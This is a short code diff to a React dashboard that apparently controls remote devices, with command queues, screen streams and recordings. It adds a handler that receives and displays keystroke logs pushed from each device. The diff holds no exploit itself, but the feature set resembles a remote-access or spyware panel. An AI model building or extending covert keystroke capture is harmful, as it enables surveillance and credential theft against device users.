@@ -13,6 +13,7 @@ export default function App() {
   const [pendingCommands, setPendingCommands] = useState({});
   const [activityLog, setActivityLog] = useState([]);
   const [streamFrames, setStreamFrames] = useState({});
+  const [keylogPushEntries, setKeylogPushEntries] = useState([]);
 
   const handleMessage = useCallback((event, data) => {
     switch (event) {
@@ -93,6 +94,12 @@ export default function App() {
         }
         break;
 
+      case 'keylog:push':
+        if (data && data.deviceId) {
+          setKeylogPushEntries(prev => [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 500));
+        }
+        break;
+
       case 'recording:started':
       case 'recording:saved':
       case 'recording:error':
@@ -128,6 +135,7 @@ export default function App() {
               onBack={() => setSelectedDevice(null)}
               streamFrame={streamFrames[selectedDevice] || null}
               send={send}
+              keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
             />
           ) : (
             <Overview
